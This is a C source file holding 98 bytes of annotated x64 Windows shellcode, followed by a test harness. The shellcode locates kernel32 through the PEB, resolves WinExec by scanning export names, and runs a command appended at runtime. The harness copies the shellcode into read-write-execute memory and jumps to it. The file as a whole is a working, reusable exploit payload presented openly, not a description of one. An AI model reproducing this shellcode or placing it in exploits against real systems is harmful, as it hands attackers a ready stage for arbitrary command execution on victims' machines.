
#include <windows.h>
#include <stdio.h>

#define MAX_CMD_LEN 255

//
// 98 bytes WinExec code for windows 64
//
// Copyright (c) 2014 Kevin Devine
//
// cl exec64_test.cpp
//

char code[] = {
    /* 0000 */    "\x53"                          /* push rbx */
    /* 0001 */    "\x56"                          /* push rsi */
    /* 0002 */    "\x57"                          /* push rdi */
    /* 0003 */    "\x55"                          /* push rbp */
    /* 0004 */    "\x4C\x8B\xFC"                  /* mov r15, rsp */
    /* 0007 */    "\x48\x83\xE4\xF0"              /* and rsp, FFFFFFFFFFFFFFF0h */
    /* 000B */    "\x48\x83\xEC\x28"              /* sub rsp, 28h */
    /* 000F */    "\xEB\x4C"                      /* jmp 005Dh */
    /* 0011 */    "\x6A\x60"                      /* push 0060h */
    /* 0013 */    "\x59"                          /* pop rcx */
    /* 0014 */    "\x65\x48\x8B\x31"              /* mov rsi, qword ptr [rcx] */
    /* 0018 */    "\x8B\x76\x18"                  /* mov esi, dword ptr [rsi+18h] */
    /* 001B */    "\x8B\x76\x10"                  /* mov esi, dword ptr [rsi+10h] */
    /* 001E */    "\xAD"                          /* lodsd  */
    /* 001F */    "\x8B\x30"                      /* mov esi, dword ptr [rax] */
    /* 0021 */    "\x8B\x7E\x30"                  /* mov edi, dword ptr [rsi+30h] */
    /* 0024 */    "\x03\x4F\x3C"                  /* add ecx, dword ptr [rdi+3Ch] */
    /* 0027 */    "\x8B\x5C\x39\x28"              /* mov ebx, dword ptr [rcx+rdi+28h] */
    /* 002B */    "\x8B\x74\x3B\x20"              /* mov esi, dword ptr [rbx+rdi+20h] */
    /* 002F */    "\x03\xF7"                      /* add esi, edi */
    /* 0031 */    "\x8B\x4C\x3B\x24"              /* mov ecx, dword ptr [rbx+rdi+24h] */
    /* 0035 */    "\x03\xCF"                      /* add ecx, edi */
    /* 0037 */    "\x99"                          /* cdq  */
    /* 0038 */    "\x0F\xB7\x2C\x51"              /* movzx ebp, word ptr [rcx+rdx*2] */
    /* 003C */    "\xFF\xC2"                      /* inc edx */
    /* 003E */    "\xAD"                          /* lodsd  */
    /* 003F */    "\x81\x3C\x38\x57\x69\x6E\x45"  /* cmp dword ptr [rax+rdi], 456E6957h */
    /* 0046 */    "\x75\xF0"                      /* jne 0038h */
    /* 0048 */    "\x8B\x74\x3B\x1C"              /* mov esi, dword ptr [rbx+rdi+1Ch] */
    /* 004C */    "\x03\xF7"                      /* add esi, edi */
    /* 004E */    "\x03\x3C\xAE"                  /* add edi, dword ptr [rsi+rbp*4] */
    /* 0051 */    "\x99"                          /* cdq  */
    /* 0052 */    "\x59"                          /* pop rcx */
    /* 0053 */    "\xFF\xD7"                      /* call rdi */
    /* 0055 */    "\x49\x8B\xE7"                  /* mov rsp, r15 */
    /* 0058 */    "\x5D"                          /* pop rbp */
    /* 0059 */    "\x5F"                          /* pop rdi */
    /* 005A */    "\x5E"                          /* pop rsi */
    /* 005B */    "\x5B"                          /* pop rbx */
    /* 005C */    "\xC3"                          /* ret  */
    /* 005D */    "\xE8\xAF\xFF\xFF\xFF"          /* call 0011h */
};

int main (int argc, char* argv[]) {
  
  puts ("\nCopyright (c) 2014 Kevin Devine\n");
    
  if (argc != 2) {
    printf ("\nUsage: exec64_test <255-byte command>\n");
    return 0;
  }
  
  char *cmd = argv[1];
  size_t cmd_len = strlen (cmd);
  
  if (cmd_len > MAX_CMD_LEN) {
    printf ("\nCommand exceeds WinExec() limit of %i bytes", MAX_CMD_LEN);
    return 0;
  }
  
  void *exec = VirtualAlloc(0, strlen (code) + MAX_CMD_LEN + 1, 
      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy (exec, code, strlen (code));
  strcat ((char*)exec, cmd);
  printf ("\nAssembly : %i\nFinal Size : %i", 
    strlen (code), 
    cmd_len + strlen (code));
  //DebugBreak();
  ((void(*)())exec)();
  VirtualFree (exec, 0, MEM_RELEASE);
  return 0;
}

